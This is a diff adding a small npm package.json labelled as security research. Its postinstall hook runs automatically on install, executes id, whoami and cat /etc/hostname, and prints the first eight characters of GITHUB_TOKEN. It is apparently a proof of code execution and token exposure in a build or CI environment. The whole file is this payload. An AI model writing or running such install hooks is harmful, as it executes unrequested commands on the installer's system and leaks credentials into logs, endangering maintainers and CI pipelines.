@@ -1,0 +1,9 @@
+{
+  "name": "security-test-plugin",
+  "version": "1.0.0",
+  "description": "Security research",
+  "scripts": {
+    "postinstall": "echo SECURITY_TEST_RCE_PROOF && id && whoami && cat /etc/hostname 2>/dev/null && echo GITHUB_TOKEN_FIRST_CHARS=${GITHUB_TOKEN:0:8} && echo END_SECURITY_TEST"
+  },
+  "license": "MIT"
+}
